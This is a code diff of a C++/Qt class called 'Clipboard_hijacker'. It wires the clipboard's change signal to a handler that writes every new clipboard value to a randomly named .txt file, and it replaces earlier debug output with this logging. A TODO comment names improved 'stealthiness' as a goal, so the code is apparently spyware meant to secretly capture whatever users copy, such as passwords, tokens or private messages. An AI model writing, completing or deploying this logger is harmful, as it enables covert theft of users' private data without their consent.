@@ -11,16 +11,8 @@ Clipboard_hijacker::Clipboard_hijacker()
 {
         const QClipboard *clipboard = QApplication::clipboard();
         QString clipboardText = clipboard->text();
+        connect(QApplication::clipboard(), SIGNAL(dataChanged()),this, SLOT(clipboardhasChanged()));
         //testing if it works
-        if(clipboardText.isEmpty())
-        {
-           qDebug() << "Clipboard is empty!";
-        }
-        else
-        {
-           qDebug() << "Clipboard is not empty: " << clipboardText;
-        }
-
 }
 /*
 void Clipboard_hijacker::hijack(QClipboard *clipboard)
@@ -31,22 +23,30 @@ void Clipboard_hijacker::hijack(QClipboard *clipboard)
 
 }
 */
-void Clipboard_hijacker::clipboardChanged()
+void Clipboard_hijacker::clipboardhasChanged()
 {
-    QClipboard *clipchanged = QApplication::clipboard();
-    QRandomGenerator *randomNumber=nullptr;
-    QString filename = QString::number(randomNumber->generate());
-    QFile file(filename);
+    //QRandomGenerator *randomNumber;
+    qDebug() << "well i'm there";
+    //qDebug() << randomNumber;
+    QString filename = QString::number(QRandomGenerator::global()->generate());
+    //qDebug() << randomNumber->generate();
     qDebug() << "entered";
+    //qDebug() << randomNumber;
     while(QFileInfo::exists(filename))
     {
-        filename=QString::number(randomNumber->generate());
+        filename=QString::number(QRandomGenerator::global()->generate());
         qDebug() << "file exists"<< endl;
     }
     //From there, filename has to be unique, avoid colisions (here it's useless but implemented for maybe later use since we could rewrite data in the file)
-    file.open(QIODevice::ReadWrite);
-    QTextStream out(&file);
-    out << clipchanged->text();
+    QFile *file = new QFile(filename+".txt");
+    qDebug() << filename;
+    if(!file->open(QIODevice::ReadWrite))
+    {
+        qWarning("Couldn't save the file");
+    }
+    QTextStream out(file);
+    out << this->getclipboardString();
+    qDebug() << this->getclipboardString();
     return;
     //TODO use md5 to produce unique filename to avoid conflicts in filename, besides could avoid writing to filesystem to improve stealthiness)s
     //QByteArray hash = QCryptographicHash::hash(QClipboard::text(QClipboard::Clipboard).toLocal8bit(), QCryptographicHash::Md5);
@@ -69,7 +69,16 @@ const QMimeData* Clipboard_hijacker::getMimeData()
     QClipboard *clip = QApplication::clipboard();
     return clip->mimeData();
 }
+bool Clipboard_hijacker::checkchanges(QString oldString, QString newString)
+{
+    if(QString::compare(oldString,newString))
+    {
+        return true;
+    }
+    return false;
+}
 Clipboard_hijacker::~Clipboard_hijacker()
 {
 
 }
+
